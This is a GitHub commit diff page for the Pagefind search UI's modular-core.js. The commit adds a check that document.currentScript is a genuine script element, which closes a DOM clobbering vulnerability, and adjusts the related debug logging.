[pagefind\_ui/modular/modular-core.js](#diff-c50eb5fec8f3c42c828513680cf04bb3c86076249d9f025f4d171e5281b08722 "pagefind_ui/modular/modular-core.js")

Show comments

[View file](/CloudCannon/pagefind/blob/14ec96864eabaf1d7d809d5da0186a8856261eeb/pagefind_ui/modular/modular-core.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -8,9 +8,12 @@ const sleep = async (ms = 50) => |
|  |  |  |
|  |  | let scriptBundlePath; |
|  |  | try { |
|  |  | scriptBundlePath = new URL(document.currentScript.src).pathname.match( |
|  |  | /^(.\*\/)(?:pagefind-)?modular-ui.js.\*$/ |
|  |  | )[1]; |
|  |  | // Important: Check that the element is indeed a <script> node, to avoid a DOM clobbering vulnerability |
|  |  | if (document?.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT') { |
|  |  | scriptBundlePath = new URL(document.currentScript.src).pathname.match( |
|  |  | /^(.\*\/)(?:pagefind-)?modular-ui.js.\*$/ |
|  |  | )[1]; |
|  |  | } |
|  |  | } catch (e) { |
|  |  | scriptBundlePath = "/pagefind/"; |
|  |  | } |
| Expand Down  Expand Up | | @@ -166,12 +169,22 @@ export class Instance { |
|  |  | console.error( |
|  |  | [ |
|  |  | `Pagefind couldn't be loaded from ${this.options.bundlePath}pagefind.js`, |
|  |  | `You can configure this by passing a bundlePath option to PagefindComposable Instance`, |
|  |  | `[DEBUG: Loaded from ${ |
|  |  | document?.currentScript?.src ?? "no known script location" |
|  |  | }]`, |
|  |  | `You can configure this by passing a bundlePath option to PagefindComposable Instance` |
|  |  | ].join("\n") |
|  |  | ); |
|  |  | // Important: Check that the element is indeed a <script> node, to avoid a DOM clobbering vulnerability |
|  |  | if ( |
|  |  | document?.currentScript && |
|  |  | document.currentScript.tagName.toUpperCase() === "SCRIPT" |
|  |  | ) { |
|  |  | console.error( |
|  |  | `[DEBUG: Loaded from ${ |
|  |  | document.currentScript?.src ?? "bad script location" |
|  |  | }]` |
|  |  | ); |
|  |  | } else { |
|  |  | console.error("no known script location"); |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | await imported\_pagefind.options(this.pagefindOptions || {}); |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `14ec968`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FCloudCannon%2Fpagefind%2Fcommit%2F14ec96864eabaf1d7d809d5da0186a8856261eeb) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


